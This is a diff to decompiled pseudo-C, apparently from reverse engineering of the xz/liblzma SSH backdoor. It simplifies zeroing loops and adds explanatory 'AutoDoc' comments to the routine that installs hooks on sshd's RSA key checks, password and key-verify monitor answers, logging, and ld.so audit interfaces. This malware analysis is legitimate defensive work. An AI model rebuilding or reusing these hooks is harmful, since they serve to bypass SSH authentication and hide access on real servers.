@@ -172,9 +172,10 @@ LAB_00105951:
         ctx = &hooks_data->global_ctx;
         imported_funcs = &hooks_data->imported_funcs;
         global_ctx_cursor = ctx;
+        // AutoDoc: Zero `hooks_data->global_ctx` so the runtime state starts from a clean slate before we publish pointers and flags.
         for (loop_idx = 0x5a; loop_idx != 0; loop_idx = loop_idx + -1) {
           global_ctx_cursor->uses_endbr64 = FALSE;
-          global_ctx_cursor = (global_context_t *)((long)global_ctx_cursor + (ulong)wipe_stride * -8 + 4);
+          global_ctx_cursor = (global_context_t *)((long)global_ctx_cursor + 4);
         }
         (hooks_data->global_ctx).sshd_log_ctx = &hooks_data->sshd_log_ctx;
         hooks_ctx_ptr = params->hook_ctx;
@@ -194,12 +195,13 @@ LAB_00105951:
           (hooks_data->global_ctx).liblzma_text_start = text_segment;
           (hooks_data->global_ctx).liblzma_text_end = (void *)((long)text_segment + liblzma_text_size);
           hooks_data_cursor = hooks_data;
+          // AutoDoc: Clear `hooks_data->ldso_ctx` so every audit pointer/bitmask starts NULL before `find_dl_audit_offsets()` populates them.
           for (loop_idx = 0x4e; loop_idx != 0; loop_idx = loop_idx + -1) {
-            (hooks_data_cursor->ldso_ctx)._unknown1459[0] = '\0';
-            (hooks_data_cursor->ldso_ctx)._unknown1459[1] = '\0';
-            (hooks_data_cursor->ldso_ctx)._unknown1459[2] = '\0';
-            (hooks_data_cursor->ldso_ctx)._unknown1459[3] = '\0';
-            hooks_data_cursor = (backdoor_hooks_data_t *)((long)hooks_data_cursor + (ulong)wipe_stride * -8 + 4);
+            (hooks_data_cursor->ldso_ctx).libcrypto_basename_buf[0] = '\0';
+            (hooks_data_cursor->ldso_ctx).libcrypto_basename_buf[1] = '\0';
+            (hooks_data_cursor->ldso_ctx).libcrypto_basename_buf[2] = '\0';
+            (hooks_data_cursor->ldso_ctx).libcrypto_basename_buf[3] = '\0';
+            hooks_data_cursor = (backdoor_hooks_data_t *)((long)hooks_data_cursor + 4);
           }
           hooks_ctx_ptr = params->hook_ctx;
           (hooks_data->ldso_ctx).imported_funcs = imported_funcs;
@@ -209,9 +211,10 @@ LAB_00105951:
           (hooks_data->ldso_ctx).hook_RSA_get0_key = rsa_get0_key_hook_ptr;
           (hooks_data->ldso_ctx).hook_EVP_PKEY_set1_RSA = evp_set1_rsa_hook_ptr;
           sshd_ctx_cursor = &hooks_data->sshd_ctx;
+          // AutoDoc: Wipe `hooks_data->sshd_ctx` so every monitor-hook pointer and scratch slot starts at zero before we seed the hook entries.
           for (loop_idx = 0x38; loop_idx != 0; loop_idx = loop_idx + -1) {
             sshd_ctx_cursor->have_mm_answer_keyallowed = FALSE;
-            sshd_ctx_cursor = (sshd_ctx_t *)((long)sshd_ctx_cursor + (ulong)wipe_stride * -8 + 4);
+            sshd_ctx_cursor = (sshd_ctx_t *)((long)sshd_ctx_cursor + 4);
           }
           (hooks_data->sshd_ctx).mm_answer_authpassword_hook =
                params->shared_globals->authpassword_hook_entry;
@@ -220,16 +223,18 @@ LAB_00105951:
                params->hook_ctx->mm_answer_keyallowed_entry;
           (hooks_data->sshd_ctx).mm_answer_keyverify_hook = keyverify_hook_entry;
           sshd_log_ctx_ptr = &hooks_data->sshd_log_ctx;
+          // AutoDoc: Zero `hooks_data->sshd_log_ctx` so the log shim starts disabled and without cached handler pointers.
           for (loop_idx = 0x1a; loop_idx != 0; loop_idx = loop_idx + -1) {
             sshd_log_ctx_ptr->log_squelched = FALSE;
-            sshd_log_ctx_ptr = (sshd_log_ctx_t *)((long)sshd_log_ctx_ptr + (ulong)wipe_stride * -8 + 4);
+            sshd_log_ctx_ptr = (sshd_log_ctx_t *)((long)sshd_log_ctx_ptr + 4);
           }
           (hooks_data->sshd_log_ctx).log_hook_entry = params->hook_ctx->mm_log_handler_entry;
           *params->shared_globals->global_ctx_slot = ctx;
           imported_funcs_cursor = imported_funcs;
+          // AutoDoc: Clear `hooks_data->imported_funcs` so the later import resolution can count and publish stubs deterministically.
           for (loop_idx = 0x4a; loop_idx != 0; loop_idx = loop_idx + -1) {
             *(u32 *)&imported_funcs_cursor->RSA_public_decrypt_orig = 0;
-            imported_funcs_cursor = (imported_funcs_t *)((long)imported_funcs_cursor + (ulong)wipe_stride * -8 + 4);
+            imported_funcs_cursor = (imported_funcs_t *)((long)imported_funcs_cursor + 4);
           }
           (hooks_data->imported_funcs).RSA_public_decrypt_plt = rsa_public_decrypt_slot;
           (hooks_data->imported_funcs).EVP_PKEY_set1_RSA_plt = evp_set1_rsa_slot;
@@ -592,7 +597,7 @@ LAB_001065af:
     decode_ctx_cursor = &syslog_dasm_ctx;
     for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
       *(u32 *)&decode_ctx_cursor->instruction = 0;
-      decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + (ulong)wipe_stride * -8 + 4);
+      decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + 4);
     }
     if ((u8 *)loader_data.sshd_string_refs.syslog_bad_level.func_start != (u8 *)0x0) {
       syslog_bad_level_cursor = (u8 *)loader_data.sshd_string_refs.syslog_bad_level.func_start;
@@ -649,7 +654,7 @@ LAB_001067fb:
           decode_ctx_cursor = &probe_dasm_ctx;
           for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
             *(u32 *)&decode_ctx_cursor->instruction = 0;
-            decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + (ulong)wipe_stride * -8 + 4);
+            decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + 4);
           }
           log_handler_slot_candidate = (log_handler_fn *)0x0;
           scan_cursor = syslog_bad_level_cursor;
@@ -772,7 +777,7 @@ LAB_00106b3c:
             decode_ctx_cursor = &probe_dasm_ctx;
             for (loop_idx = 0x16; scan_cursor = syslog_bad_level_cursor, loop_idx != 0; loop_idx = loop_idx + -1) {
               *(u32 *)&decode_ctx_cursor->instruction = 0;
-              decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + (ulong)wipe_stride * -8 + 4);
+              decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + 4);
             }
             do {
               probe_success = find_instruction_with_mem_operand_ex
@@ -881,7 +886,7 @@ LAB_00106bf0:
     audit_ifaces_zero_cursor = audit_ifaces_slot_ptr;
     for (loop_idx = 0x1e; loop_idx != 0; loop_idx = loop_idx + -1) {
       *(u32 *)&audit_ifaces_zero_cursor->activity = 0;
-      audit_ifaces_zero_cursor = (audit_ifaces *)((long)audit_ifaces_zero_cursor + (ulong)wipe_stride * -8 + 4);
+      audit_ifaces_zero_cursor = (audit_ifaces *)((long)audit_ifaces_zero_cursor + 4);
     }
     (hooks_data->ldso_ctx).hooked_audit_ifaces.symbind =
          (audit_symbind_fn_t)params->hook_ctx->symbind64_trampoline;
